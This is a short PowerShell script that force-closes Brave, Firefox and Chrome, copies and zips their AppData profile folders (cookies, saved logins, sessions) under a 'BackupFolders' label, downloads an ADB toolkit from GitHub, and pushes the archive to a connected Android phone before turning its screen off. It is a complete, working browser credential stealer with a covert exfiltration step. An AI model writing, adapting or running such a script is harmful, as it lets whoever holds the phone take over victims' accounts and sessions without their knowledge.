$user = $env:USERNAME

$destinationPath = Join-Path $env:TEMP "BackupFolders"
$zipFilePath = Join-Path $env:TEMP "BackupFolders.zip"

$processesToClose = @("brave.exe", "firefox.exe", "chrome.exe")

foreach ($processName in $processesToClose) {
    Get-Process -Name $processName -ErrorAction SilentlyContinue | Stop-Process -Force
}

$foldersToCopy = @(
    "C:\Users\$user\AppData\Local\Google",
    "C:\Users\$user\AppData\Local\BraveSoftware",
    "C:\Users\$user\AppData\Local\Mozilla"
)

$existingFolders = $foldersToCopy | Where-Object { Test-Path $_ }

foreach ($folder in $existingFolders) {
    Copy-Item -Path $folder -Destination $destinationPath -Recurse -Force
}

Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::CreateFromDirectory($destinationPath, $zipFilePath)

$adbZipUrl = "https://github.com/d4rks1d33/ADB-Tools/raw/main/ADB.zip"
$adbZipPath = Join-Path $env:TEMP "ADB.zip"
Invoke-WebRequest -Uri $adbZipUrl -OutFile $adbZipPath

Expand-Archive -Path $adbZipPath -DestinationPath $env:TEMP -Force

$adbExecutable = Join-Path $env:TEMP "adb.exe"

$androidDestinationPath = "/storage/emulated/0/Documents"

if (Test-Path $zipFilePath) {
    & $adbExecutable push "$zipFilePath" "$androidDestinationPath"
} else {
    Write-Host "Error: El archivo ZIP no existe en la ubicación especificada."
}

& $adbExecutable shell input keyevent 26
